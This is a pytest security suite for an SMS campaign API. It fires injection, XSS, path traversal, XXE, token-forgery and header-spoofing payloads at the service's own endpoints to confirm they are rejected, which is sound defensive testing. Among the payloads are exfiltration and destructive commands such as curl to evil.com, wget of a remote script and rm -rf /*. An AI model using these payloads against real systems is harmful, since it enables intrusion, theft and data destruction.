"""
Security testing for SMS Campaign Generation API.

Tests cover security vulnerabilities including injection attacks,
authentication bypass, rate limiting bypass, and data exposure.
"""

import pytest
import json
import re
from httpx import AsyncClient
from fastapi.testclient import TestClient

from src.api.main import create_application


@pytest.mark.security
class TestInputValidationSecurity:
    """Test input validation security."""

    @pytest.fixture
    def app(self):
        """Create FastAPI application for testing."""
        return create_application()

    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return TestClient(app)

    def test_sql_injection_attempts(self, client):
        """Test SQL injection attack attempts."""
        sql_injection_payloads = [
            "'; DROP TABLE campaigns; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM users",
            "'; INSERT INTO campaigns VALUES ('malicious'); --",
            "1'; DELETE FROM users WHERE '1'='1",
            "' OR 1=1#",
            "admin'--",
            "' OR 'x'='x",
            "1' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA --"
        ]

        for payload in sql_injection_payloads:
            response = client.post(
                "/api/v1/generateFlow",
                json={
                    "campaignDescription": payload
                }
            )

            # Should not return 500 (server error) which might indicate SQL injection
            assert response.status_code in [200, 400, 422, 429], f"SQL injection attempt may have succeeded: {payload}"

            # Response should not contain database error messages
            response_text = response.text.lower()
            db_error_patterns = [
                "sql", "mysql", "postgresql", "sqlite", "oracle",
                "syntax error", "near", "where", "table", "column"
            ]

            for pattern in db_error_patterns:
                assert pattern not in response_text, f"Database error pattern found in response: {pattern}"

    def test_xss_attempts(self, client):
        """Test Cross-Site Scripting attack attempts."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
            "<svg onload=alert('xss')>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<input autofocus onfocus=alert('xss')>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>",
            "<keygen onfocus=alert('xss') autofocus>",
            "<video><source onerror=alert('xss')>",
            "<audio src=x onerror=alert('xss')>"
        ]

        for payload in xss_payloads:
            response = client.post(
                "/api/v1/generateFlow",
                json={
                    "campaignDescription": payload
                }
            )

            # Response should not contain the unescaped XSS payload
            response_text = response.text
            assert payload not in response_text, f"XSS payload not sanitized: {payload}"

            # Check for HTML tag escaping
            if "<" in payload and ">" in payload:
                assert "&lt;" in response_text or payload not in response_text, "HTML tags not properly escaped"

    def test_path_traversal_attempts(self, client):
        """Test path traversal attack attempts."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "/var/www/../../etc/passwd",
            "/etc/passwd%00",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
        ]

        for payload in path_traversal_payloads:
            response = client.post(
                "/api/v1/generateFlow",
                json={
                    "campaignDescription": payload
                }
            )

            # Should not return file contents
            response_text = response.text.lower()
            file_indicators = [
                "root:x:0:0",  # Unix /etc/passwd pattern
                "administrators",  # Windows pattern
                "system32",  # Windows system directory
                "bin/bash",  # Unix shell
                "password:",  # Password file pattern
                "daemon:",  # Unix daemon pattern
                "localhost",  # Hosts file pattern
            ]

            for indicator in file_indicators:
                assert indicator not in response_text, f"File content indicator found: {indicator}"

    def test_command_injection_attempts(self, client):
        """Test command injection attack attempts."""
        command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "& echo 'vulnerable'",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| curl http://evil.com/steal?data=$(whoami)",
            "; rm -rf /*",
            "& ping -c 10 127.0.0.1",
            "`wget http://malicious.com/script.sh`",
            "; python -c 'import os; os.system(\"whoami\")'",
            "&& echo 'INJECTION'",
            "|| echo 'FAIL'",
            "; nslookup evil.com",
            "| dig evil.com"
        ]

        for payload in command_injection_payloads:
            response = client.post(
                "/api/v1/generateFlow",
                json={
                    "campaignDescription": payload
                }
            )

            # Response should not contain command output
            response_text = response.text.lower()
            command_output_patterns = [
                "uid=", "gid=",  # Unix id command output
                "root", "bin", "daemon",  # Common Unix users
                "total ", "drwx",  # ls command output
                "ping statistics",  # ping output
                "dns query",  # nslookup/dig output
                "http://", "https://",  # URLs that might indicate command execution
                "vulnerable",  # Test command output
                "injection",  # Test command output
            ]

            for pattern in command_output_patterns:
                # Allow legitimate use of these patterns in campaign descriptions
                if not ("create a " in payload.lower() or "campaign" in payload.lower()):
                    # More careful checking for command output
                    if pattern in ["uid=", "gid=", "total ", "drwx", "ping statistics", "dns query"]:
                        assert pattern not in response_text, f"Command output pattern found: {pattern}"

    def test_ldap_injection_attempts(self, client):
        """Test LDAP injection attack attempts."""
        ldap_injection_payloads = [
            "*)(uid=*",
            "*)(&(uid=*",
            "*)(|(objectClass=*)",
            "*))%00",
            "admin)(&(password=*))",
            "*)(|(objectClass=*)(uid=*",
            "*)(|(cn=*",
            "*)(&(objectClass=user)",
            "*))(|(cn=*",
            "*)(!(objectClass=*)",
            "admin)(|(password=*))%00"
        ]

        for payload in ldap_injection_payloads:
            response = client.post(
                "/api/v1/generateFlow",
                json={
                    "campaignDescription": payload
                }
            )

            # Should not cause LDAP errors or return directory information
            response_text = response.text.lower()
            ldap_error_patterns = [
                "ldap", "active directory", "directory service",
                "invalid credentials", "ldap error",
                "objectclass", "distinguishedname", "cn=",
                "ou=", "dc=", "ldap://"
            ]

            for pattern in ldap_error_patterns:
                assert pattern not in response_text, f"LDAP error pattern found: {pattern}"

    def test_xml_injection_attempts(self, client):
        """Test XML injection attack attempts."""
        xml_injection_payloads = [
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
            "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://evil.com/malicious.xml\">]><root>&xxe;</root>",
            "<script>alert('xss')</script>",
            "]]></root><script>alert('xss')</script>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><data>&xxe;</data>",
            "<![CDATA[<script>alert('xss')</script>]]>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><root>&xxe;</root>"
        ]

        for payload in xml_injection_payloads:
            response = client.post(
                "/api/v1/generateFlow",
                json={
                    "campaignDescription": payload
                }
            )

            # Should not process XML entities or scripts
            response_text = response.text
            assert payload not in response_text, f"XML injection payload not sanitized: {payload}"

    def test_large_payload_attacks(self, client):
        """Test attacks with large payloads."""
        # Very large campaign description
        large_payload = "A" * 1000000  # 1MB payload

        response = client.post(
            "/api/v1/generateFlow",
            json={
                "campaignDescription": large_payload
            }
        )

        # Should either accept with size limit or reject properly
        assert response.status_code in [200, 413, 422], f"Unexpected response to large payload: {response.status_code}"

        # Deeply nested JSON attack
        deep_json = {"campaignDescription": "test"}
        for i in range(1000):  # Create deep nesting
            deep_json = {"nested": deep_json}

        response = client.post(
            "/api/v1/generateFlow",
            json=deep_json
        )

        # Should handle deep nesting without crashing
        assert response.status_code in [200, 422, 413], f"Deep nesting attack may have succeeded: {response.status_code}"

    def test_unicode_and_encoding_attacks(self, client):
        """Test Unicode and encoding-based attacks."""
        unicode_payloads = [
            "\ufeff\x00\x00\x00",  # BOM attack
            "\ufffd" * 1000,  # Replacement character attack
            "\x00" * 1000,  # Null byte attack
            "\n\r\t" * 1000,  # Control character attack
            "🔥💣🚀" * 100,  # Emoji bomb
            "\u200b" * 1000,  # Zero-width space attack
            "\u202e" + "dangerous",  # Right-to-left override attack
            "\uff0e" * 100,  # Fullwidth character attack
        ]

        for payload in unicode_payloads:
            response = client.post(
                "/api/v1/generateFlow",
                json={
                    "campaignDescription": payload
                }
            )

            # Should handle Unicode properly without errors
            assert response.status_code in [200, 422], f"Unicode attack may have caused issues: {response.status_code}"


@pytest.mark.security
class TestAuthenticationSecurity:
    """Test authentication security."""

    @pytest.fixture
    def app(self):
        """Create FastAPI application for testing."""
        return create_application()

    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return TestClient(app)

    def test_missing_authentication(self, client):
        """Test requests without authentication."""
        # Test endpoints that should require authentication
        protected_endpoints = [
            "/api/v1/stats"
        ]

        for endpoint in protected_endpoints:
            response = client.get(endpoint)
            # Should either allow (if auth is optional) or require auth
            assert response.status_code in [200, 401, 403], f"Unexpected auth behavior for {endpoint}"

    def test_invalid_authentication_tokens(self, client):
        """Test requests with invalid authentication tokens."""
        invalid_tokens = [
            "invalid-token",
            "Bearer invalid-token",
            "Bearer " + "A" * 1000,  # Very long token
            "Bearer ",  # Empty token
            "Bearer null",
            "Bearer undefined",
            "Bearer false",
            "Bearer " + json.dumps({"malicious": "payload"}),  # JSON token
            "Bearer <script>alert('xss')</script>",  # XSS in token
            "Bearer '; DROP TABLE users; --",  # SQL injection in token
        ]

        for token in invalid_tokens:
            response = client.get(
                "/api/v1/stats",
                headers={"Authorization": token}
            )

            # Should reject invalid tokens
            assert response.status_code in [401, 403, 422], f"Invalid token accepted: {token[:50]}"

    def test_token_manipulation_attacks(self, client):
        """Test token manipulation and forgery attacks."""
        # Try common token patterns
        token_patterns = [
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",  # Fake JWT
            "Bearer YWRtaW46cGFzc3dvcmQ=",  # Base64 admin:password
            "Bearer " + "1" * 256,  # Long numeric token
            "Bearer " + "0" * 256,  # Zero token
            "Bearer " + "f" * 256,  # Hex token
        ]

        for token in token_patterns:
            response = client.get(
                "/api/v1/stats",
                headers={"Authorization": token}
            )

            # Should reject forged tokens
            assert response.status_code in [401, 403], f"Forged token may have been accepted: {token[:50]}"

    def test_authorization_bypass_attempts(self, client):
        """Test attempts to bypass authorization controls."""
        # Try different authorization headers
        auth_headers = [
            {"X-API-Key": "master-key"},
            {"X-Auth-Token": "admin-token"},
            {"X-User-Role": "admin"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "localhost"},
            {"X-Originating-IP": "admin-ip"},
            {"X-Remote-User": "admin"},
            {"X-Remote-Addr": "127.0.0.1"},
        ]

        for headers in auth_headers:
            response = client.get(
                "/api/v1/stats",
                headers=headers
            )

            # Should not accept alternative auth methods
            if response.status_code == 200:
                # If accepted, ensure no sensitive data is exposed
                response_text = response.text.lower()
                sensitive_patterns = [
                    "admin", "password", "secret", "key", "token",
                    "internal", "system", "debug", "config"
                ]
                for pattern in sensitive_patterns:
                    # Allow these words in legitimate contexts
                    if not ("statistics" in response_text or "campaign" in response_text):
                        assert pattern not in response_text, f"Sensitive data exposed with headers: {headers}"


@pytest.mark.security
class TestRateLimitingSecurity:
    """Test rate limiting security."""

    @pytest.fixture
    def app(self):
        """Create FastAPI application for testing."""
        return create_application()

    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return TestClient(app)

    def test_rate_limiting_bypass_attempts(self, client):
        """Test attempts to bypass rate limiting."""
        # Make multiple rapid requests
        responses = []
        for i in range(50):  # 50 requests rapidly
            response = client.post(
                "/api/v1/generateFlow",
                json={
                    "campaignDescription": f"Test campaign {i}"
                },
                headers={
                    "X-Forwarded-For": f"192.168.1.{i%255}",  # Try different IPs
                    "X-Real-IP": f"10.0.0.{i%255}",
                    "User-Agent": f"Bot-{i}",  # Different user agents
                }
            )
            responses.append(response)

        # Check if rate limiting is working
        rate_limited_responses = [r for r in responses if r.status_code == 429]
        success_responses = [r for r in responses if r.status_code == 200]

        print(f"Rate limiting results: {len(rate_limited_responses)} rate limited, {len(success_responses)} successful")

        # Should have some rate limiting if the feature is enabled
        if len(rate_limited_responses) > 0:
            print("✓ Rate limiting is working")
        else:
            print("? Rate limiting may not be enabled or thresholds are high")

    def test_rate_limiting_header_manipulation(self, client):
        """Test manipulating headers to bypass rate limiting."""
        # Try various header combinations to bypass rate limiting
        header_sets = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Cluster-Client-IP": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Original-URL": "/different/endpoint"},
            {"X-Rewrite-URL": "/different/endpoint"},
        ]

        for headers in header_sets:
            response = client.post(
                "/api/v1/generateFlow",
                json={"campaignDescription": "Rate limiting test"},
                headers=headers
            )

            # Should not bypass rate limiting with header manipulation
            if response.status_code == 429:
                print(f"✓ Rate limiting caught header manipulation: {headers}")
                break

    def test_concurrent_rate_limiting_bypass(self, client):
        """Test concurrent requests to bypass rate limiting."""
        import threading
        import time

        results = []

        def make_request(request_id):
            response = client.post(
                "/api/v1/generateFlow",
                json={"campaignDescription": f"Concurrent test {request_id}"},
                headers={"X-Request-ID": str(request_id)}
            )
            results.append((request_id, response.status_code))

        # Launch 20 concurrent requests
        threads = []
        start_time = time.time()

        for i in range(20):
            thread = threading.Thread(target=make_request, args=(i,))
            threads.append(thread)
            thread.start()

        # Wait for all requests to complete
        for thread in threads:
            thread.join()

        end_time = time.time()
        duration = end_time - start_time

        # Analyze results
        status_codes = [code for _, code in results]
        rate_limited_count = status_codes.count(429)
        success_count = status_codes.count(200)

        print(f"Concurrent test: {rate_limited_count} rate limited, {success_count} successful in {duration:.2f}s")

        # Rate limiting should catch some concurrent requests
        if rate_limited_count > 0:
            print("✓ Rate limiting working for concurrent requests")


@pytest.mark.security
class TestDataExposureSecurity:
    """Test for data exposure and information leakage."""

    @pytest.fixture
    def app(self):
        """Create FastAPI application for testing."""
        return create_application()

    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return TestClient(app)

    def test_error_message_information_disclosure(self, client):
        """Test that error messages don't disclose sensitive information."""
        # Trigger various errors
        error_triggers = [
            ({}, "Empty request"),
            ({"campaignDescription": ""}, "Empty description"),
            ({"campaignDescription": "A"}, "Too short description"),
            ({"invalidField": "test"}, "Invalid field"),
            ({"campaignDescription": "A" * 10000}, "Too long description"),
        ]

        for payload, description in error_triggers:
            response = client.post("/api/v1/generateFlow", json=payload)

            # Error responses should not contain sensitive information
            response_text = response.text.lower()
            sensitive_patterns = [
                "traceback", "exception", "error at line",
                "/var/www/", "/home/", "/root/",
                "database", "sql", "mysql", "postgresql",
                "internal server error", "stack trace",
                "file ", "directory ", "path ",
                "password", "secret", "key", "token",
                "admin", "root", "system",
            ]

            for pattern in sensitive_patterns:
                # Allow some patterns in legitimate error messages
                if pattern in ["server", "error", "file"]:
                    continue

                assert pattern not in response_text, f"Sensitive information '{pattern}' disclosed in {description}"

    def test_api_version_information_disclosure(self, client):
        """Test that API responses don't disclose excessive version information."""
        # Check various endpoints for version information
        endpoints = [
            "/health",
            "/api/v1/health",
            "/api/v1/stats",
            "/docs",  # If docs are enabled
            "/openapi.json",  # If OpenAPI is enabled
        ]

        for endpoint in endpoints:
            response = client.get(endpoint)
            response_text = response.text.lower()

            # Check for excessive version details
            version_patterns = [
                "python/", "django/", "flask/",
                "fastapi/", "uvicorn/",
                "ubuntu/", "debian/", "centos/",
                "nginx/", "apache/",
                "postgresql-", "mysql-",
                "node.js", "npm",
            ]

            for pattern in version_patterns:
                if pattern in response_text:
                    print(f"⚠ Version information disclosed in {endpoint}: {pattern}")

    def test_debug_information_disclosure(self, client):
        """Test that debug information is not disclosed in production."""
        # Try to access debug endpoints or trigger debug mode
        debug_attempts = [
            "/debug",
            "/debug/info",
            "/debug/config",
            "/debug/routes",
            "/admin",
            "/admin/debug",
            "/?debug=true",
            "/?verbose=1",
            "/?trace=1",
        ]

        for debug_path in debug_attempts:
            response = client.get(debug_path)

            # Should not expose debug information
            if response.status_code == 200:
                response_text = response.text.lower()
                debug_patterns = [
                    "debug", "trace", "stack trace",
                    "environment variables", "env",
                    "settings", "configuration",
                    "route", "endpoint",
                    "module", "import",
                ]

                for pattern in debug_patterns:
                    # Be more careful with common words
                    if pattern in ["settings", "configuration"]:
                        if "debug" in response_text or "trace" in response_text:
                            assert False, f"Debug information exposed at {debug_path}"
                    elif pattern not in ["route", "endpoint"]:
                        assert pattern not in response_text, f"Debug pattern '{pattern}' found at {debug_path}"

    def test_server_headers_information_disclosure(self, client):
        """Test that server headers don't disclose excessive information."""
        response = client.get("/health")

        # Check response headers
        server_header = response.headers.get("Server", "")
        x_powered_by = response.headers.get("X-Powered-By", "")

        # Should not contain detailed server information
        verbose_patterns = [
            "nginx/", "apache/", "iis/",
            "python/", "php/", "node.js",
            "ubuntu/", "debian/", "centos/",
        ]

        for pattern in verbose_patterns:
            assert pattern not in server_header.lower(), f"Verbose server header: {server_header}"
            assert pattern not in x_powered_by.lower(), f"Verbose X-Powered-By header: {x_powered_by}"

    def test_directory_traversal_in_static_files(self, client):
        """Test directory traversal in static file requests."""
        # Try to access files outside the web root
        malicious_paths = [
            "/static/../../../etc/passwd",
            "/static/..%2F..%2F..%2Fetc%2Fpasswd",
            "/static/..\\..\\..\\windows\\system32\\config\\sam",
            "/static/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/static/..%252f..%252f..%252fetc%252fpasswd",
            "/static/....//....//....//etc/passwd",
            "/files/../../../etc/passwd",
            "/assets/../../../../root/.ssh/id_rsa",
            "/css/../../../etc/passwd",
            "/js/../../../etc/passwd",
        ]

        for path in malicious_paths:
            response = client.get(path)

            # Should not return file contents
            if response.status_code == 200:
                response_text = response.text.lower()
                file_patterns = [
                    "root:x:0:0", "bin/bash", "administrators",
                    "system32", "private key", "begin rsa",
                ]

                for pattern in file_patterns:
                    assert pattern not in response_text, f"File content exposed via {path}"


@pytest.mark.security
class TestCSRFSecurity:
    """Test Cross-Site Request Forgery (CSRF) protection."""

    @pytest.fixture
    def app(self):
        """Create FastAPI application for testing."""
        return create_application()

    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return TestClient(app)

    def test_csrf_token_validation(self, client):
        """Test CSRF token validation if implemented."""
        # Check if CSRF protection is implemented
        response = client.post(
            "/api/v1/generateFlow",
            json={"campaignDescription": "CSRF test"},
            headers={
                "Referer": "http://evil.com",
                "Origin": "http://evil.com",
            }
        )

        # If CSRF protection is enabled, should reject cross-origin requests
        if response.status_code == 403:
            print("✓ CSRF protection appears to be active")
        elif response.status_code in [200, 422]:
            print("? CSRF protection may not be implemented (common for APIs)")

    def test_cors_policy_enforcement(self, client):
        """Test CORS policy enforcement."""
        # Test preflight request from unauthorized origin
        response = client.options(
            "/api/v1/generateFlow",
            headers={
                "Origin": "http://evil.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type",
            }
        )

        # Check CORS headers
        cors_headers = [
            "Access-Control-Allow-Origin",
            "Access-Control-Allow-Methods",
            "Access-Control-Allow-Headers",
        ]

        cors_configured = any(header in response.headers for header in cors_headers)

        if cors_configured:
            allowed_origin = response.headers.get("Access-Control-Allow-Origin", "")
            if allowed_origin == "*" or allowed_origin == "http://evil.com":
                print("⚠ CORS policy may be too permissive")
            else:
                print("✓ CORS policy appears to be properly configured")
        else:
            print("? CORS headers not present")

    def test_content_type_validation(self, client):
        """Test Content-Type validation for CSRF protection."""
        # Try requests with suspicious content types
        suspicious_content_types = [
            "text/html",
            "application/javascript",
            "text/javascript",
            "application/xml",
            "text/xml",
        ]

        for content_type in suspicious_content_types:
            response = client.post(
                "/api/v1/generateFlow",
                data='{"campaignDescription": "test"}',  # Send as data, not json
                headers={"Content-Type": content_type}
            )

            # Should reject suspicious content types or handle safely
            if response.status_code == 200:
                response_text = response.text.lower()
                # Ensure no script execution occurred
                assert "<script" not in response_text
                assert "javascript:" not in response_text


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])